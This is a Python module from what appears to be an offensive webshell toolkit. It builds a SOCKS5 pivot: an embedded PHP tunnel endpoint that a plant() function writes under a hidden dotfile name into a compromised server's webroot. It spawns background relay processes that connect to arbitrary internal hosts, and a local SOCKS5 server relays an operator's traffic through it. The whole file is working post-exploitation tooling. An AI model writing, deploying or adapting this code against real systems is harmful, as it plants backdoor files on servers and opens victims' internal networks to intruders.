"""SOCKS5 pivot through the webshell (reGeorg-style).

A local SOCKS5 server relays TCP over HTTP to a small **tunnel endpoint** planted
on the target. The hard part is that PHP can't keep a socket open across stateless
HTTP requests, so on ``connect`` the endpoint spawns a *background relay process*
that bridges the target TCP socket to two on-disk spool files; subsequent
``read``/``write``/``close`` requests just move bytes through those files. The
operator then points any SOCKS5-aware tool (``curl --socks5``, ``proxychains``,
a browser) at the local port to reach hosts only the target can see.

Flow:  SOCKS client ⇄ Socks5Server (local) ⇄ HTTP ⇄ tunnel.php ⇄ relay ⇄ target:port
"""

from __future__ import annotations

import socket
import socketserver
import struct
import threading
import time

import requests

from .. import log
from ..config import Config
from ..utils.strings import random_string

# The planted endpoint. Web requests dispatch on ``cmd``; the same file run from
# the PHP CLI (argv[1] == "relay") is the per-connection bridge process.
_TUNNEL_PHP = r"""<?php
error_reporting(0);set_time_limit(0);
function spool($sid){return sys_get_temp_dir()."/wstun_".preg_replace('/[^a-zA-Z0-9]/','',$sid);}
if(php_sapi_name()==='cli' && isset($argv[1]) && $argv[1]==='relay'){
  $dir=spool($argv[2]);$sock=@fsockopen($argv[3],intval($argv[4]),$en,$es,5);
  if(!$sock){file_put_contents("$dir/closed","1");exit;}
  stream_set_blocking($sock,false);$inoff=0;
  while(true){
    if(file_exists("$dir/close"))break;
    $d=fread($sock,8192);
    if($d!==''&&$d!==false){$f=fopen("$dir/out","ab");flock($f,LOCK_EX);fwrite($f,$d);flock($f,LOCK_UN);fclose($f);}
    if(feof($sock))break;
    clearstatcache();
    $sz=file_exists("$dir/in")?filesize("$dir/in"):0;
    if($sz>$inoff){$f=fopen("$dir/in","rb");fseek($f,$inoff);$c=fread($f,$sz-$inoff);fclose($f);fwrite($sock,$c);$inoff=$sz;}
    usleep(8000);
  }
  @fclose($sock);file_put_contents("$dir/closed","1");exit;
}
$cmd=isset($_REQUEST['cmd'])?$_REQUEST['cmd']:'';$sid=isset($_REQUEST['sid'])?$_REQUEST['sid']:'';
$dir=spool($sid);
if($cmd==='connect'){
  @mkdir($dir);file_put_contents("$dir/in","");file_put_contents("$dir/out","");
  $c=escapeshellarg(PHP_BINARY)." ".escapeshellarg(__FILE__)." relay ".escapeshellarg($sid)." ".escapeshellarg($_REQUEST['host'])." ".intval($_REQUEST['port'])." >/dev/null 2>&1 &";
  exec($c);echo "OK";
}elseif($cmd==='write'){
  $f=fopen("$dir/in","ab");flock($f,LOCK_EX);fwrite($f,file_get_contents('php://input'));flock($f,LOCK_UN);fclose($f);echo "OK";
}elseif($cmd==='read'){
  $data='';$f=@fopen("$dir/out","c+b");if($f){flock($f,LOCK_EX);$data=stream_get_contents($f);ftruncate($f,0);flock($f,LOCK_UN);fclose($f);}
  if($data===''&&file_exists("$dir/closed"))header('X-Closed: 1');
  echo base64_encode($data);
}elseif($cmd==='close'){
  file_put_contents("$dir/close","1");echo "OK";
}
"""


def tunnel_php_source() -> str:
    """Return the source of the tunnel endpoint to plant on the target."""
    return _TUNNEL_PHP


def plant(ws) -> str:  # noqa: ANN001 - WebShell (avoid import cycle in signature)
    """Write the tunnel endpoint to the webroot and return its public URL."""
    from ..exceptions import WebshellError
    from ..utils.http import base_url

    name = f".{random_string(10)}.php"
    path = f"{ws.webroot.rstrip('/')}/{name}"
    if not ws.executor.fs_write(path, tunnel_php_source().encode()):
        raise WebshellError("failed to plant the tunnel endpoint (webroot not writable?)")
    return f"{base_url(ws.url)}/{name}"


class TunnelClient:
    """Talks to a planted tunnel endpoint over HTTP (one session per TCP conn)."""

    def __init__(self, url: str, config: Config | None = None):
        self.url = url
        self.config = config or Config()
        self._session = requests.Session()

    def _post(self, params: dict[str, str], data: bytes = b"") -> requests.Response:
        return self._session.post(
            self.url, params=params, data=data,
            timeout=self.config.timeout, proxies=self.config.proxies,
            verify=self.config.verify_ssl,
        )

    def connect(self, host: str, port: int) -> str | None:
        sid = random_string(12)
        resp = self._post({"cmd": "connect", "sid": sid, "host": host, "port": str(port)})
        return sid if resp.ok and "OK" in resp.text else None

    def write(self, sid: str, data: bytes) -> None:
        self._post({"cmd": "write", "sid": sid}, data=data)

    def read(self, sid: str) -> tuple[bytes, bool]:
        import base64

        resp = self._post({"cmd": "read", "sid": sid})
        closed = resp.headers.get("X-Closed") == "1"
        return base64.b64decode(resp.text or ""), closed

    def close(self, sid: str) -> None:
        import contextlib

        with contextlib.suppress(requests.RequestException):
            self._post({"cmd": "close", "sid": sid})


def _parse_socks5_target(conn: socket.socket) -> tuple[str, int] | None:
    """Complete a SOCKS5 no-auth handshake; return the CONNECT target."""
    head = conn.recv(2)
    if len(head) < 2 or head[0] != 0x05:
        return None
    nmethods = head[1]
    conn.recv(nmethods)  # discard offered methods
    conn.sendall(b"\x05\x00")  # no authentication
    req = conn.recv(4)
    if len(req) < 4 or req[1] != 0x01:  # only CONNECT
        conn.sendall(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00")
        return None
    atyp = req[3]
    if atyp == 0x01:  # IPv4
        host = socket.inet_ntoa(conn.recv(4))
    elif atyp == 0x03:  # domain
        length = conn.recv(1)[0]
        host = conn.recv(length).decode("utf-8", "replace")
    elif atyp == 0x04:  # IPv6
        host = socket.inet_ntop(socket.AF_INET6, conn.recv(16))
    else:
        return None
    port = struct.unpack(">H", conn.recv(2))[0]
    return host, port


def _bridge(conn: socket.socket, tunnel: TunnelClient, sid: str) -> None:
    """Pump bytes both ways between the local SOCKS socket and the tunnel."""
    conn.setblocking(False)
    while True:
        try:
            data = conn.recv(8192)
            if data == b"":
                break  # SOCKS client closed
            if data:
                tunnel.write(sid, data)
        except BlockingIOError:
            pass
        except OSError:
            break
        try:
            out, closed = tunnel.read(sid)
        except requests.RequestException:
            break
        if out:
            try:
                conn.sendall(out)
            except OSError:
                break
        if closed:
            break
        time.sleep(0.02)
    tunnel.close(sid)


def make_handler(tunnel: TunnelClient) -> type[socketserver.BaseRequestHandler]:
    class _Handler(socketserver.BaseRequestHandler):
        def handle(self) -> None:
            target = _parse_socks5_target(self.request)
            if not target:
                return
            host, port = target
            sid = tunnel.connect(host, port)
            if not sid:
                self.request.sendall(b"\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00")  # failure
                return
            self.request.sendall(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")  # success
            _bridge(self.request, tunnel, sid)

    return _Handler


class _ThreadingServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


def serve(
    tunnel_url: str, local_host: str = "127.0.0.1", local_port: int = 1080,
    config: Config | None = None,
) -> _ThreadingServer:
    """Start a local SOCKS5 server relaying through ``tunnel_url`` (returns it running).

    Call ``.shutdown()`` on the returned server to stop it.
    """
    tunnel = TunnelClient(tunnel_url, config)
    server = _ThreadingServer((local_host, local_port), make_handler(tunnel))
    threading.Thread(target=server.serve_forever, daemon=True).start()
    log.success(f"SOCKS5 proxy on {local_host}:{server.server_address[1]} -> {tunnel_url}")
    return server
